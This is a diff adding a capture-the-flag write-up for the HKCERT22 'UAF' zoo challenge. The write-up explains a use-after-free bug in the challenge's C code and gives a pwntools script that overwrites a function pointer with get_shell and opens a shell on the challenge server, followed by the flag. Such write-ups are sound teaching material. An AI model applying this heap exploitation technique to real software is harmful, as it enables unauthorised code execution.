@@ -143,8 +143,157 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="uaf"><a class="header" href="#uaf">UAF</a></h1>
-<h1 id="challenge-details"><a class="header" href="#challenge-details">Challenge details</a></h1>
+                        <p>s# UAF</p>
+<h2 id="challenge-details"><a class="header" href="#challenge-details">Challenge details</a></h2>
+<p><img src="assets/uaf_detail.png" alt="" /></p>
+<h2 id="analysis"><a class="header" href="#analysis">Analysis</a></h2>
+<p>This program has a <code>get_shell()</code> function. The target of this challenge is to execute this function.</p>
+<pre><code class="language-c">void get_shell() {
+    system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<p>The <code>add_animal()</code> function will create 2 heap chunks and put in the list. </p>
+<pre><code class="language-c">void add_animal() {
+    int choice;
+    int size;
+    int idx;
+    Animal* animal;
+
+    if (zoo.numOfAnimal &gt;= ZOO_SIZE) {
+        print(&quot;[ERROR] The zoo is full.&quot;);
+        return;
+    }
+
+    for (idx = 0; idx &lt; ZOO_SIZE; idx++) {
+        if (zoo.animals[idx] == NULL) {
+            break;
+        }
+    }
+
+    animal = (Animal*) malloc(sizeof(Animal));
+
+    print(&quot;Type of animal?&quot;);
+    print(&quot;1) Parrot&quot;);
+    print(&quot;2) Panda&quot;);
+
+    while (1) {
+        printf(&quot;&gt; &quot;);
+        scanf(&quot;%d&quot;, &amp;choice);
+        if (choice == 1) {
+            animal-&gt;type = PARROT;
+            break;
+        } 
+        if (choice == 2) {
+            animal-&gt;type = PANDA;
+            break;
+        }
+        printf(&quot;??\n&quot;);
+    }
+
+    animal-&gt;speak = speak;
+    print(&quot;How long is the name? (max: 64 characters)&quot;);   
+    while (1) {
+        printf(&quot;&gt; &quot;);
+        scanf(&quot;%d&quot;, &amp;size);
+        if (size &gt;= 0 &amp;&amp; size &lt; MAX_NAME_SIZE) {
+            animal-&gt;name = (char*) malloc(size);
+            break;
+        } 
+        printf(&quot;??\n&quot;);
+    }
+
+    print(&quot;Name of animal?&quot;);
+    printf(&quot;&gt; &quot;);
+    read(0, animal-&gt;name, size);
+
+    zoo.animals[idx] = animal;
+    printf(&quot;&gt; [DEBUG] Animal is added to zone %d\n&quot;, idx);
+    zoo.numOfAnimal++;
+}
+</code></pre>
+<p>The data structure is:</p>
+<pre><code class="language-c">struct Animal
+{
+    speakFunc speak;
+    enum AnimalType type;
+    char* name;
+};
+</code></pre>
+<p>You can see that there is a function pointer <code>speak</code> which will be called after <code>report_name()</code> function (<code>speak(name)</code>). Our target is overwrite <code>speak</code> with the address of <code>get_shell</code>.</p>
+<pre><code class="language-c">void report_name() {
+    &lt;SNIP&gt;
+    zoo.animals[choice]-&gt;speak(zoo.animals[choice]-&gt;name);
+}
+</code></pre>
+<p>Every time a new <code>Animal</code> is created, the pointer will will be inserted to <code>zoo[idx]</code> where <code>idx</code> is the first NULL pointer. Hence, use-after-free (UAF) can be applied. If we can overwrite the address of <code>speak</code> and call <code>report_name()</code>, <code>get_shell()</code> will be called.</p>
+<pre><code class="language-c">void remove_animal() {
+    int choice;
+
+    &lt;SNIP&gt;
+
+    free(zoo.animals[choice]-&gt;name);
+    free(zoo.animals[choice]);
+
+    printf(&quot;&gt; [DEBUG] Animal is removed from zone %d\n&quot;, choice);
+    
+    zoo.numOfAnimal--;
+}
+</code></pre>
+<p>We want to make the <code>malloc()</code> allocate location to <code>name</code> that previous allocated to animal. Look at how GDB is executed.</p>
+<p>Since the <code>add_animal()</code> request 2 heap chunks at once, the 2 chunks are allocated and freed in pairs.
+<img src="assets/uaf_gdb1.png" alt="" /></p>
+<p>As we can specify the size of the name, we can allocated name with size 0x40 (2 chunks <code>A</code>: 0x20,  <code>B</code>: 0x40), then create an animal with name chunk size 0x20 (2 chunks <code>C</code>: 0x20, <code>D</code>: 0x20). Thus, if these 2 chunks are freed and add a new animal with size 0x20, the chunks <code>A</code> and <code>C</code> will be allocated. If we the name to this animal, the address of <code>speak()</code> of the 2nd animal will be overwritten.
+<img src="assets/uaf_gdb2.png" alt="" /></p>
+<h2 id="solution"><a class="header" href="#solution">Solution</a></h2>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+context.arch = 'amd64'
+
+e = ELF('./zoo')
+# r = gdb.debug('./zoo', 'b* remove_animal\nc')
+r = remote('chal.hkcert22.pwnable.hk', 28235)
+def create(size, data):
+    r.sendlineafter(b'Exit\n&gt; ', b'1')
+    r.sendlineafter(b'2) Panda', b'1')
+    r.sendlineafter(b'name? ', str(size).encode())
+    r.sendafter(b'animal?', data)
+
+def delete(id):
+    r.sendlineafter(b'Exit\n&gt; ', b'2')
+    r.sendlineafter(b'(0-9)', str(id).encode())
+
+def report(id):
+    r.sendlineafter(b'Exit\n&gt; ', b'3')
+    r.sendlineafter(b'(0-9)', str(id).encode())
+# 0
+create(0x30, b'AAAAAAAAA')
+# 1
+create(0x18, b'AAAAAAAAA')
+# 2
+create(0x18, b'AAAAAAAAA')
+# 3
+create(0x18, b'AAAAAAAAA')
+# 4
+create(0x18, b'AAAAAAAAA')
+# 5
+create(0x18, b'AAAAAAAAA')
+# 6
+create(0x18, b'AAAAAAAAA')
+# 7
+create(0x18, b'AAAAAAAAA')
+
+
+delete(1)
+delete(0)
+
+# 8
+create(0x18, p64(e.symbols['get_shell']))
+report(1)
+r.interactive()
+</code></pre>
+<h2 id="flag"><a class="header" href="#flag">Flag</a></h2>
+<p><code>hkcert22{w3L1C0me_70_World_0f_pwN_h34P_z0o}</code></p>
 
                     </main>
 
